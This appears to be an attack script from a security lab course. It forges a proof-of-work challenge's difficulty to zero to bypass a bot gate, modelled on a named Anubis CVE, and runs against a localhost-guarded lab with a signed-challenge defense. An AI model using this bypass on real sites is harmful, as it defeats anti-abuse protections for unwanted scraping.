"""
Chapter 6, Round 1 attack (b): don't solve the puzzle, edit it.

Objective: read the client side of the protocol and notice that the challenge comes back to
the server *from us*. Set "difficulty": 0 and any counter is a valid solution, at zero CPU cost.

    payload = <the gate's 403>.error.payload      # {"nonce": ..., "difficulty": 16, ...}
    payload["difficulty"] = 0                     # the whole attack
    POST /api/challenge/verify {"type": "pow", "answer": {"challenge": payload, "counter": 0}}

This is CVE-2025-24369 in Anubis, found in January 2025.

Expected:
  DEFENSE_LEVEL=0     120/120 (no gate)
  DEFENSE_LEVEL=1     120/120, 0 hashes computed
  DEFENSE_LEVEL>=2    0/120, pow_reason "challenge signature invalid (was it edited?)"

    python attacks/round1_forge_difficulty.py
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import labclient  # noqa: E402,F401  (the localhost guard runs on import)
from pow_client import SKUS, Tally, bot, finish, redeem, scrape  # noqa: E402


def run():
    tally = Tally("round1_forge_difficulty")

    def forged_pass(payload):
        payload = dict(payload, difficulty=0)
        ok, why = redeem(c, payload, 0)
        if not ok:
            tally.note(f"verify refused: {why}")
        return ok

    c = bot("pow-forge", index=2)
    scrape(c, tally, SKUS, get_pass=forged_pass)
    return tally.result()


if __name__ == "__main__":
    print("=== Round 1b: forge difficulty 0 ===")
    finish(run())
